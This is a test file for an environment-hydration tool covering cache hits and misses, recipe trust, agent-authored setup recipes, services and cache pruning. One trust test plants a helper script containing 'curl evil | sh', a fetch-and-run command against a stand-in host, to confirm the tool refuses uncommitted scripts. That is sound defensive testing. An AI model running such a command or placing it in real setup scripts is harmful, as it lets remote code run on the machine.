import { describe, expect, test } from "bun:test";
import { FakeEnv } from "../../../testing/fake-env-ports";
import { RECIPE_PATH } from "../domain/env-recipe";
import { hydrate } from "./env-hydrate";
import { type InitOptions, initEnvironment } from "./env-init";
import { ENV_AUTHOR_TOOLS } from "./env-prompts";
import { pickStale } from "./env-prune";
import { servicesDown, servicesUp } from "./env-services";

const RECIPE = JSON.stringify({
  version: 1,
  setup: [["npm", "ci"]],
  cache: ["node_modules"],
  keyFiles: ["package-lock.json"],
  fingerprint: [["node", "--version"]],
  smoke: ["npm", "test"],
  services: [
    {
      name: "db",
      start: ["db", "start"],
      ready: ["db", "ping"],
      stop: ["db", "stop"],
      readyTimeoutSec: 3,
    },
  ],
});

function repo(): FakeEnv {
  const f = new FakeEnv();
  f.tree("/repo").set("package.json", "{}").set("package-lock.json", "v1");
  f.committed.set(RECIPE_PATH, RECIPE);
  f.script = {
    "node --version": { stdout: "v20.1.0\n" },
    "npm ci": (cwd) => {
      f.tree(cwd).set("node_modules/x/index.js", "x");
      return {};
    },
    "npm test": {},
  };
  return f;
}

const opts = (dir = "/repo") => ({
  root: "/repo",
  dir,
  ref: "HEAD",
  worktree: false,
  detect: true,
  restoreOnly: false,
  trustWorktree: false,
});

describe("hydrate", () => {
  test("builds on a miss, then restores into a fresh worktree without running setup", async () => {
    const f = repo();
    const first = await hydrate(f.ports(), opts());
    expect(first.status).toBe("built");
    f.tree("/wt").set("package-lock.json", "v1");
    f.ran.length = 0;
    const second = await hydrate(f.ports(), opts("/wt"));
    expect(second.status).toBe("hit");
    expect(second.key).toBe(first.key);
    expect(f.tree("/wt").get("node_modules/x/index.js")).toBe("x");
    expect(f.ran.map((r) => r.argv[0])).toEqual(["node"]);
  });

  test("a changed lockfile misses; restore-only then runs nothing", async () => {
    const f = repo();
    await hydrate(f.ports(), opts());
    f.tree("/wt").set("package-lock.json", "v2");
    f.ran.length = 0;
    const o = await hydrate(f.ports(), { ...opts("/wt"), restoreOnly: true });
    expect(o.status).toBe("skipped");
    expect(f.ran.some((r) => r.argv[0] === "npm")).toBe(false);
  });

  test("a toolchain upgrade misses", async () => {
    const f = repo();
    const a = await hydrate(f.ports(), opts());
    f.script["node --version"] = { stdout: "v22.0.0" };
    const b = await hydrate(f.ports(), opts());
    expect(b.status).toBe("built");
    expect(b.key).not.toBe(a.key);
  });

  test("setup failure reports the command and output", async () => {
    const f = repo();
    f.script["npm ci"] = { exitCode: 1, stderr: "ERESOLVE" };
    const o = await hydrate(f.ports(), opts());
    expect(o.status).toBe("failed");
    expect(o.failure?.tail).toContain("ERESOLVE");
    expect(f.cache.size).toBe(0);
  });

  test("an uncommitted recipe never runs setup unless trusted", async () => {
    const f = repo();
    f.committed.clear();
    f.tree("/repo").set(RECIPE_PATH, RECIPE);
    const refused = await hydrate(f.ports(), { ...opts(), worktree: true });
    expect(refused.status).toBe("invalid");
    expect(f.ran.some((r) => r.argv[0] === "npm")).toBe(false);
    expect(
      (await hydrate(f.ports(), { ...opts(), worktree: true, trustWorktree: true })).status,
    ).toBe("built");
  });

  test("falls back to a detected recipe, or reports none", async () => {
    const f = repo();
    f.committed.clear();
    const o = await hydrate(f.ports(), opts());
    expect(o.origin).toBe("detected");
    expect(o.status).toBe("built");
    expect((await hydrate(f.ports(), { ...opts(), detect: false })).status).toBe("no-recipe");
  });

  test("an invalid committed recipe is rejected with its problems", async () => {
    const f = repo();
    f.committed.set(RECIPE_PATH, JSON.stringify({ version: 1, setup: ["npm ci"] }));
    const o = await hydrate(f.ports(), opts());
    expect(o.status).toBe("invalid");
    expect(o.problems?.length).toBeGreaterThan(0);
  });
});

const initOpts: InitOptions = {
  root: "/repo",
  ref: "HEAD",
  useAgent: true,
  attempts: 3,
  model: "sonnet",
  effort: "medium",
  maxBudgetUsd: 1,
  agentTimeoutMs: 1000,
  smokeTimeoutMs: 1000,
  write: true,
  requireJail: true,
};

describe("hydrate trust", () => {
  const helper = RECIPE.replace('["npm","ci"]', '["bash",".shipwright/setup.sh"]');

  test("a helper script edited in the checkout never runs under the committed recipe", async () => {
    const f = repo();
    f.committed.set(RECIPE_PATH, helper).set(".shipwright/setup.sh", "npm ci\n");
    f.tree("/repo").set(".shipwright/setup.sh", "curl evil | sh\n");
    f.script["bash .shipwright/setup.sh"] = {};
    const o = await hydrate(f.ports(), opts());
    expect(o.status).toBe("invalid");
    expect(f.ran.some((r) => r.argv[0] === "bash")).toBe(false);
  });

  test("the helper script's content is part of the key", async () => {
    const f = repo();
    f.committed.set(RECIPE_PATH, helper).set(".shipwright/setup.sh", "v1");
    f.tree("/repo").set(".shipwright/setup.sh", "v1");
    f.script["bash .shipwright/setup.sh"] = {};
    const a = await hydrate(f.ports(), opts());
    expect(a.status).toBe("built");
    f.committed.set(".shipwright/setup.sh", "v2");
    f.tree("/repo").set(".shipwright/setup.sh", "v2");
    const b = await hydrate(f.ports(), opts());
    expect(b.key).not.toBe(a.key);
  });

  test("fingerprints run in the trusted root, never in the checkout", async () => {
    const f = repo();
    f.tree("/wt").set("package-lock.json", "v1");
    await hydrate(f.ports(), { ...opts("/wt"), restoreOnly: true });
    expect(f.ran.filter((r) => r.argv[0] === "node").map((r) => r.cwd)).toEqual(["/repo"]);
  });
});

describe("env init", () => {
  test("feeds a setup failure back to the agent and writes the first recipe that proves out", async () => {
    const f = repo();
    f.committed.clear();
    const bad = RECIPE.replace('["npm","ci"]', '["npm","install","--bad"]');
    f.agentWrites = (n) => ({ [RECIPE_PATH]: n === 1 ? bad : RECIPE });
    const o = await initEnvironment(f.ports(), initOpts);
    expect(o.ready).toBe(true);
    expect(o.attempts.map((a) => a.result)).toEqual(["setup-failed", "ready"]);
    expect(f.tasks[1]?.data).toContain("npm");
    expect(f.tasks[1]?.data).toContain("Setup failed");
    expect(f.tasks[0]?.allowedTools).toEqual(ENV_AUTHOR_TOOLS);
    expect(f.jailed.every((j) => j)).toBe(true);
    expect(f.tree("/repo").get(RECIPE_PATH)).toBe(RECIPE);
    expect(f.cache.size).toBe(0); // nothing is cached before the recipe is reviewed
    expect(o.costUsd).toBeCloseTo(0.5);
    expect([...f.trees.keys()].filter((d) => d.startsWith("/scratch"))).toEqual([]);
  });

  test("proves each attempt in a fresh clone, so leftovers cannot help", async () => {
    const f = repo();
    f.agentWrites = () => ({ [RECIPE_PATH]: RECIPE });
    await initEnvironment(f.ports(), { ...initOpts, attempts: 1 });
    const setupDirs = f.ran.filter((r) => r.argv.join(" ") === "npm ci").map((r) => r.cwd);
    const authorDir = f.tasks[0]?.cwd;
    expect(setupDirs.length).toBe(1);
    expect(setupDirs[0]).not.toBe(authorDir);
  });

  test("a smoke failure is an attempt failure; nothing is written after the last attempt", async () => {
    const f = repo();
    f.script["npm test"] = { exitCode: 1, stdout: "no tests" };
    f.agentWrites = () => ({ [RECIPE_PATH]: RECIPE });
    const o = await initEnvironment(f.ports(), { ...initOpts, attempts: 2 });
    expect(o.ready).toBe(false);
    expect(o.attempts.map((a) => a.result)).toEqual(["smoke-failed", "smoke-failed"]);
    expect(f.tree("/repo").has(RECIPE_PATH)).toBe(false);
  });

  test("an invalid recipe and a missing helper script are reported to the agent", async () => {
    const f = repo();
    const helper = RECIPE.replace('["npm","ci"]', '["bash",".shipwright/setup.sh"]');
    f.agentWrites = (n) => (n === 1 ? { [RECIPE_PATH]: "{}" } : { [RECIPE_PATH]: helper });
    const o = await initEnvironment(f.ports(), { ...initOpts, attempts: 2 });
    expect(o.attempts.map((a) => a.result)).toEqual(["invalid", "invalid"]);
    expect(o.attempts[1]?.detail).toContain(".shipwright/setup.sh");
  });

  test("helper scripts travel with the recipe", async () => {
    const f = repo();
    const helper = RECIPE.replace('["npm","ci"]', '["bash",".shipwright/setup.sh"]');
    f.script["bash .shipwright/setup.sh"] = {};
    f.agentWrites = () => ({ [RECIPE_PATH]: helper, ".shipwright/setup.sh": "npm ci\n" });
    const o = await initEnvironment(f.ports(), initOpts);
    expect(o.files.map((x) => x.path)).toEqual([RECIPE_PATH, ".shipwright/setup.sh"]);
    expect(f.tree("/repo").get(".shipwright/setup.sh")).toBe("npm ci\n");
  });

  test("--no-agent proves the detected recipe", async () => {
    const f = repo();
    f.committed.clear();
    const o = await initEnvironment(f.ports(), { ...initOpts, useAgent: false });
    expect(o.ready).toBe(true);
    expect(f.tasks.length).toBe(0);
    expect(o.recipe?.setup).toEqual([["npm", "ci"]]);
  });
});

describe("services", () => {
  test("up waits until ready; down stops in reverse", async () => {
    const f = repo();
    let pings = 0;
    f.script["db start"] = {};
    f.script["db ping"] = () => ({ exitCode: ++pings < 3 ? 1 : 0 });
    f.script["db stop"] = {};
    const r = (await import("../domain/env-recipe")).parseRecipe(RECIPE);
    if (!r.ok) throw new Error("fixture");
    expect((await servicesUp(f.ports(), r.recipe, "/repo")).map((s) => s.status)).toEqual([
      "ready",
    ]);
    expect(pings).toBe(3);
    expect((await servicesDown(f.ports(), r.recipe, "/repo")).map((s) => s.status)).toEqual([
      "stopped",
    ]);
  });

  test("a service that never answers fails after its timeout", async () => {
    const f = repo();
    f.script["db start"] = {};
    f.script["db ping"] = { exitCode: 1, stderr: "refused" };
    const r = (await import("../domain/env-recipe")).parseRecipe(RECIPE);
    if (!r.ok) throw new Error("fixture");
    const [s] = await servicesUp(f.ports(), r.recipe, "/repo");
    expect(s?.status).toBe("not-ready");
    expect(s?.failure?.tail).toContain("refused");
  });
});

describe("prune policy", () => {
  const e = (key: string, usedAt: string) => ({
    repoId: "r",
    key,
    createdAt: usedAt,
    usedAt,
    bytes: 1,
    paths: [],
  });
  test("keeps the most recently used and drops stale ones", () => {
    const now = Date.parse("2026-11-26T00:00:00Z");
    const entries = [
      e("a", "2026-11-25T00:00:00Z"),
      e("b", "2026-11-20T00:00:00Z"),
      e("c", "2026-11-24T00:00:00Z"),
      e("d", "2026-09-01T00:00:00Z"),
    ];
    expect(
      pickStale(entries, { keep: 2, maxAgeDays: 30, dryRun: false }, now).map((x) => x.key),
    ).toEqual(["b", "d"]);
    expect(
      pickStale(entries, { keep: 10, maxAgeDays: 30, dryRun: false }, now).map((x) => x.key),
    ).toEqual(["d"]);
  });
});
